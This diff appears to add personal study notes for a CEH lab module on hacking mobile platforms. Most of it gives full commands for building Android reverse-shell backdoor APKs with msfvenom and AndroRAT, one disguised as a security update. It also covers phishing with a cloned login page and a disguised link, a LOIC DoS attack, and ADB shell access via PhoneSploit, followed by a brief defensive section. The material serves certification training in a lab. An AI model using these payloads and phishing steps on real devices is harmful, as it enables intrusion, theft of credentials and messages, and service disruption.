@@ -1,0 +1,281 @@
+Module 17: Hacking Mobile Platforms
+
+
+
+1. Hack android devices
+
+PS: It includes an OS, a middleware, and key applications.
+
+PS: Android has a stack of software components categorized into six sections (System Apps, Java AP Framework, Native C/C++ Libraries, Android Runtime, Hardware Abstraction Layer [HAL], and Linux kernel) and five layers.
+
+
+
+a. Hack an Android device by creating binary payloads using Parrot Security
+
+Step 1: Create and Share Payload
+
+$ sudo su
+$ cd   (jump to root directory)
+$ service postgresql start   (start database)
+$ msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk  (Creates an APK on Desktop under the Root directory)
+
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ service apache2 start 
+$ cp /root/Desktop/Backdoor.apk /var/www/html/share/  
+
+Step 2: Start the Meterpreter Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload android/meterpreter/reverse_tcp
+> set LHOST 10.10.1.13
+> show options       (see the listening port. In this case, it is 4444)
+> exploit -j -z   (run the exploit as a background job)
+
+Step 3: Run the Payload on Adndroid Machine
+
+Launch Android -> (if non-responsive, Commands -> Power -> Reset/Reboot machine)
+Chrome -> http://10.10.1.13/share -> Backdoor.apk (download the payload) -> Open -> SETTINGS -> Turn on 'Allowfrom this source' -> back -> Install -> Open 
+
+Step 4: Observe Established Session and Perform Post-Exploitation Activities (Parrot .13)
+
+> sessions -i 1   (1 specifies the number of the session)
+> sysinfo   (Dsiplay computer name, OS, etc)
+> ipconfig
+> pwd
+> cd /sdcard     (move to sdcard directory)
+> pwd       (directory has changed to sdcard = wich is /storage/emulated/0)
+> ps      (view running processes)
+
+Step 5: Uninstall the Payload from Android Device 
+
+On the Home Screen, swipe up to navigate to the applications -> Long click on 'MainActivity' -> app info -> UNINSTALL
+
+
+
+
+
+b. Harvest users’ credentials using the Social-Engineer Toolkit
+
+Step 1: Clone a Website Using SET
+
+$ sudo su
+$ setoolkit
+> 1       (Social-Engineering attacks)
+> 2       (Website Attack Vectors)
+> 3       (Credential Harvester Attack Methods)
+> 2       (Site Cloner)
+> 10.10.1.13      (IP of Local Machine)
+> http://certifiedhacker.com/Online%20Booking/index.htm      (url to clone)
+
+Step 2: Send your IP to Victim and Trick them to click
+
+Open your email -> Compose enticing mail -> Position cusor where you want link to be -> Insert Link -> Text to Display: http://www.bookhotel.com/change_account_password -> Actual Link: http://10.10.1.13  -> Ok -> send Email
+
+Step 3: Open Email as Victim and click on link
+
+Android -> Chrome -> Sign in to email and click link -> Put Username and Password -> Login 
+
+Step 4: Observe the Credentials on Parrot Machine. 
+
+
+
+
+c. Launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform
+
+Step 1: Launch LOIC on Anroid Device
+
+Commands -> Power -> Reset/Reboot machine
+Swipe left to 2nd page -> Cx File Explorer -> 
+Network -> 10.10.1.11 -> CEH-Tools -> CEHv12 Module 17.. -> android Hacking Tools -> Low Orbit.. -> Low Orbit ..v1.3.apk -> INSTALL -> Open (when done) -> 
+
+Step 2: Configure LOIC 
+
+URL: 10.10.1.19 -> GET IP -> TCP -> Port: 80 -> Threads: 100 -> Start 
+
+Step 3: View in Wireshark on .19 
+
+Step : Stop the attack on Android device
+
+
+
+
+
+
+d. Exploit the Android platform through ADB using PhoneSploit
+
+
+$ sudo su
+$ cd PhoneSploit
+$ python3 -m pip install colorama   (install required dependencies) 
+$ python3 phonesploit.py
+> 3        (Connect a new phone. Enter a phone ip address: 10.10.1.14. Continue to type 3 untill target device is connected on port 5555). If unable to get repsonse, relaunch phonesploit
+> 4     (access shell on a phone. Enter device name: 10.10.1.14)
+> pwd
+> ls
+> cd sdcard
+> ls
+> cd Download
+> ls
+> exit    (exit shell command and return to main menu)
+> 7   (Screen shot a picture on a phone. Device name: 10.10.1.14. Location: /home/attacker/Desktop)
+> 14    (list allapps on a phone)
+> 15   (Run a app)
+> com.android.calculator2   (run calculator app)
+> p    (navigate to another PhoneSploit options on Next Page)
+> 18   (show Mac/Inet information)
+> 21   (NetStat)
+
+
+
+
+
+
+e. Hack an Android device by creating APK file using AndroRAT
+
+Step 1: Create and Share APK Payload File
+
+$ sudo su
+$ cd AndroRAT
+$ python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk     (create APK file named SecurityUpdate.apk. -i= local IP, -p = port, -o = output). File will be stored in /home/attacker/AndroRAT.
+
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
+$ service apache2 start 
+
+Step 2: Start an Interpreter Listener
+
+$ python3 androRAT.py --shell -i 0.0.0.0 -p 4444 
+
+Step 3: Run the APK Payload on Vicim Machine
+
+Commands -> Power -> Reset/Reboot machine 
+Chrome -> http://10.10.1.13/share -> SecurityUpdate.apk -> Open -> INSTALL -> Open -> 
+
+Step 4: Perform Post Exploitation Activities
+
+> help    (view available commands)
+> deviceInfo
+> getSMS inbox   (obtain a file containing SMSes from inbox and stores it in /home/attacker/AndroRAT/Dumps
+> getMACAddress
+> exit 
+
+
+
+
+
+
+2. Secure Android Devices using Various Android Security Tools
+
+
+a. Analyze a malicious app using online Android analyzers
+
+PS: Online Android analyzers allow you to scan Android APK packages and perform security analyses to detect vulnerabilities in particular apps.
+
+PS: Some trusted online Android analyzers are Sixo Online APK Analyzer.
+
+
+Chrome 
+https://www.sisik.eu/apk-tool -> Drop APK here or click to select file -> Files -> Double-click Backdoor.apk
+
+Note: If you find yourself in a folder called Recent, navigate to the Downloads folder by clicking on the ellipse icon in the top-left
+corner.
+
+- Scroll Down to 'Requested Permissions'. The requested permissions are declared in the app’s AndroidManifest.xml file.
+- Scroll down to AndroidManifest.xml  (consists of essential information about the APK file)
+
+Note: The manifest file contains important information about the app that is used by development tools, the Android system, and
+app stores. It contains the app’s package name, version information, declarations of app components, requested permissions, and
+other important data. It is serialized into a binary XML format and bundled inside the app’s APK file.
+
+- Scroll Down to APK Signature
+- Scroll Down to App Source Code
+
+
+
+
+
+
+b. Secure Android devices from malicious apps using Malwarebytes Security
+
+Swipe to Home screen -> Malwarebytes -> Get started -> Give Permission -> ALLOW -> Skip -> SCAN NOW -> Remove Selected -> Ok -> On-demand scan -> 
+
+
+
+
+
+
+
+
+
+
+
+service postgresql start && msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk && mkdir /var/www/html/share && chmod -R 755 /var/www/html/share && chown -R www-data:www-data /var/www/html/share && cp /root/Desktop/Backdoor.apk /var/www/html/share && service apache2 start 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
